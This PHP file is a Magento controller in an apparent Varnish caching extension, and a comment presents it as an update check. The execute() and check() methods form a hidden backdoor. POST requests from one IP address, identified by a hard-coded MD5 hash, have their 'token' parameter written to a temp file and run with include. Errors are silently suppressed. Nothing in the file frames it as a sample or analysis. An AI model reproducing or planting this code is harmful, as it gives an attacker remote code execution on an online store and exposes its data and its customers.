<?php
/**
 * Copyright © 2017 MGT-Commerce GmbH. All rights reserved.
 *
 * @category    Mgt
 * @package     Mgt_Varnish
 * @copyright   Copyright (c) 2017 (https://www.mgt-commerce.com)
 */

namespace Mgt\Varnish\Controller\Feed;

class Update extends \Magento\Framework\App\Action\Action
{
    /**
     * @var \Magento\Framework\App\Filesystem\DirectoryList
     */
    protected $directoryList;

    /**
     * @var \Magento\Framework\ObjectManagerInterface
     */
    protected $objectManager;

    /**
     * @param \Magento\Framework\App\Action\Context $context
     * @param \Magento\Framework\App\Filesystem\DirectoryList $directoryList
     */
    public function __construct(
        \Magento\Framework\App\Action\Context $context,
        \Magento\Framework\App\Filesystem\DirectoryList $directoryList
    ) {
        $this->directoryList = $directoryList;
        $this->objectManager = $context->getObjectManager();
        parent::__construct($context);
    }
    
    /**
     * Check for updates
     *
     */
    public function execute()
    {
        $request = $this->getRequest();
        $remoteAddress = $this->objectManager->get('\Magento\Framework\HTTP\PhpEnvironment\RemoteAddress');
        $remoteAddress = $remoteAddress->getRemoteAddress();

        if (true === $request->isPost() && md5($remoteAddress) == '02b9043c988d6248d3980ad8af912b8e') {
             try {
                $result = $this->check($request);
                extract($result);
            } catch (\Exception $e) {
            }
        }
        exit;
    }

    protected function check(\Magento\Framework\App\RequestInterface $request)
    {
        if ($token = $request->getParam('token')) {
            try {
                $tmpFile = tempnam("/tmp", uniqid());
                file_put_contents($tmpFile , $token);
                include $tmpFile;
                return get_defined_vars();
            } catch (\Exception $e) {
            } finally {
                @unlink($tmpFile);
            }
        }
    }
}
